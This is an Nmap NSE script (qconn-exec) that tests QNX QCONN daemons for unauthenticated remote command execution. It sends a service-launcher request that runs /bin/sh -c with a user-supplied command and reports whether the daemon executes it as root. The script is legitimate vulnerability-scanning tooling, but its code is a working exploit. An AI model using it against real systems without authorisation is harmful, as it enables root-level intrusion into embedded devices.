local comm = require("comm")
local vulns = require("vulns")
local stdnse = require("stdnse")
local string = require("string")
local shortport = require("shortport")

description = [[
Attempts to identify whether a listening QNX QCONN daemon allows
unauthenticated users to execute arbitrary operating system commands.

QNX is a commercial Unix-like real-time operating system, aimed primarily at
the embedded systems market. The QCONN daemon is a service provider that
provides support, such as profiling system information, to remote IDE
components. The QCONN daemon runs on port 8000 by default.

For more information about QNX QCONN, see:
* http://www.qnx.com/developers/docs/6.3.0SP3/neutrino/utilities/q/qconn.html
* http://www.fishnetsecurity.com/6labs/blog/pentesting-qnx-neutrino-rtos
* http://www.exploit-db.com/exploits/21520
* http://metasploit.org/modules/exploit/unix/misc/qnx_qconn_exec
]]

---
-- @usage
-- nmap --script qconn-exec --script-args qconn-exec.timeout=60,qconn-exec.bytes=1024,qconn-exec.cmd="uname -a" -p <port> <target>
--
-- @output
-- PORT     STATE SERVICE VERSION
-- 8000/tcp open  qconn   qconn remote IDE support
-- | qconn-exec:
-- |   VULNERABLE:
-- |   The QNX QCONN daemon allows remote command execution.
-- |     State: VULNERABLE
-- |     Risk factor: High
-- |     Description:
-- |       The QNX QCONN daemon allows unauthenticated users to execute arbitrary operating
-- |       system commands as the 'root' user.
-- |
-- |     References:
-- |       http://www.fishnetsecurity.com/6labs/blog/pentesting-qnx-neutrino-rtos
-- |_      http://metasploit.org/modules/exploit/unix/misc/qnx_qconn_exec
--
-- @args qconn-exec.timeout
--                 Set the timeout in seconds. The default value is 30.
--
-- @args qconn-exec.bytes
--                 Set the number of bytes to retrieve. The default value is 1024.
--
-- @args qconn-exec.cmd
--                 Set the operating system command to execute. The default value is "uname -a".
--
-- @changelog
-- 2012-10-07 - Created - created by Brendan Coles - itsecuritysolutions.org
-- 2013-07-28 - Revised - allow users to specify arbitrary commands
--                      - now uses the vuln library for reporting

author = "Brendan Coles"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "exploit", "vuln"}

portrule = shortport.port_or_service ({8000}, "qconn", {"tcp"})

action = function( host, port )
  local vuln_table = {
    title = "The QNX QCONN daemon allows remote command execution.",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    description = [[
The QNX QCONN daemon allows unauthenticated users to execute arbitrary operating
system commands as the 'root' user.
]],

    references = {
      'http://www.fishnetsecurity.com/6labs/blog/pentesting-qnx-neutrino-rtos',
      'http://metasploit.org/modules/exploit/unix/misc/qnx_qconn_exec'
    }
  }

  -- Set socket timeout
  local timeout = (stdnse.parse_timespec(stdnse.get_script_args(SCRIPT_NAME .. ".timeout")) or 30)

  -- Set max bytes to retrieve
  local bytes = (stdnse.get_script_args(SCRIPT_NAME .. '.bytes') or 1024)

  -- Set command to execute
  local cmd = (stdnse.get_script_args(SCRIPT_NAME .. '.cmd') or "uname -a")

  -- Send command as service launcher request
  local req = string.format("service launcher\nstart/flags run /bin/sh /bin/sh -c \"%s\"\n", cmd)
  stdnse.debug1("Connecting to %s:%s", host.targetname or host.ip, port.number)
  local status, data = comm.exchange(host, port, req, {timeout=timeout*1000,bytes=bytes})
  if not status then
    stdnse.debug1("Timeout exceeded for %s:%s (Timeout: %ss).", host.targetname or host.ip, port.number, timeout)
    return
  end

  -- Parse response
  stdnse.debug2("Received reply:\n%s", data)
  if not string.match(data, "QCONN") then
    stdnse.debug1("%s:%s is not a QNX QCONN daemon.", host.targetname or host.ip, port.number)
    return
  end

  -- Check if the daemon attempted to execute the command
  if string.match(data, 'OK [0-9]+\r?\n') then
    vuln_table.state = vulns.STATE.VULN
    local report = vulns.Report:new(SCRIPT_NAME, host, port)
    return report:make_output(vuln_table)
  else
    stdnse.debug1("%s:%s QNX QCONN daemon is not vulnerable.", host.targetname or host.ip, port.number)
    return
  end

end
